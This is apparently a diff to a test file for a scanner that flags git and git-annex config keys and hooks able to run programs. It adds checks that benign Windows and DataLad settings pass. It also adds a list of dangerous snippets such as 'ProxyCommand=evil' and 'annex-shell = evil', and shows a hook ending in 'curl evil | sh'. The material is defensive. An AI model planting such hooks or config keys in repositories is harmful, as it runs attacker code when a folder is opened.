@@ -41,6 +41,32 @@ test('the stock git-annex hooks and filter are not flagged', async () => {
   assert.deepEqual(await findExecVectors(dir), [])
 })
 
+// `git annex init` on Windows (no symlinks, "crippled" filesystem) writes more keys than on macOS/Linux;
+// flagging them made a perfectly normal DataLad dataset prompt on every open.
+test('the extra settings git and git-annex write on Windows are not flagged', async () => {
+  const dir = await repo({
+    config: '[core]\n\tsymlinks = false\n\tlongpaths = true\n\tprotectntfs = true\n\thidedotfiles = dotgitonly\n' +
+      '[annex]\n\tcrippledfilesystem = true\n\tadjustedbranchrefresh = true\n\tbackend = SHA256E\n\tfreezecontent = false\n' +
+      '[remote "origin"]\n\turl = https://example.org/ds.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n\tannex-uuid = 1\n\tannex-ignore = true\n\tannex-cost = 150\n'
+  })
+  assert.deepEqual(await findExecVectors(dir), [])
+})
+
+test('annex settings that launch a program are still flagged', async () => {
+  for (const snippet of [
+    '[annex]\n\tssh-options = -o ProxyCommand=evil\n',
+    '[annex]\n\tsecure-erase-command = evil\n',
+    '[annex]\n\tstalldetection = 1\n\thttp-headers-command = evil\n',
+    '[remote "o"]\n\tannex-externaltype = evil\n',
+    '[remote "o"]\n\tannex-shell = evil\n',
+    '[remote "o"]\n\tannex-rsync-options = -e evil\n',
+    '[remote "o"]\n\tannex-ssh-options = -o ProxyCommand=evil\n',
+    '[core]\n\teditor = evil\n'
+  ]) {
+    assert.ok((await findExecVectors(await repo({ config: snippet }))).length > 0, `not flagged: ${snippet}`)
+  }
+})
+
 test('a git-annex hook with an extra line is flagged', async () => {
   assert.match(await flagged(await repo({ hooks: { 'pre-commit': `${ANNEX_PRE_COMMIT}curl evil | sh\n` } })), /hook pre-commit/)
 })
@@ -117,4 +143,25 @@ test('the trust store remembers folders across instances', async () => {
   assert.equal(first.has(target), false)
   first.add(target)
   assert.equal(createTrustStore(file).has(target), true)
+})
+
+// The ground truth: what `datalad create` really writes on this OS must not be flagged
+// (Windows CI runs this with real git-annex; a failure prints exactly which settings tripped it).
+const hasDatalad = (() => {
+  try {
+    execFileSync('datalad', ['--version'], { stdio: 'ignore' })
+    return true
+  } catch {
+    return false
+  }
+})()
+
+test('a freshly created DataLad dataset is not flagged', { skip: !hasDatalad && 'datalad not installed' }, async () => {
+  const root = await realpath(await mkdtemp(join(tmpdir(), 'trust-real-')))
+  const dir = join(root, 'ds')
+  execFileSync('datalad', ['create', dir], {
+    stdio: 'ignore',
+    env: { ...process.env, GIT_AUTHOR_NAME: 'x', GIT_AUTHOR_EMAIL: 'x@x.io', GIT_COMMITTER_NAME: 'x', GIT_COMMITTER_EMAIL: 'x@x.io' }
+  })
+  assert.deepEqual(await findExecVectors(dir), [])
 })
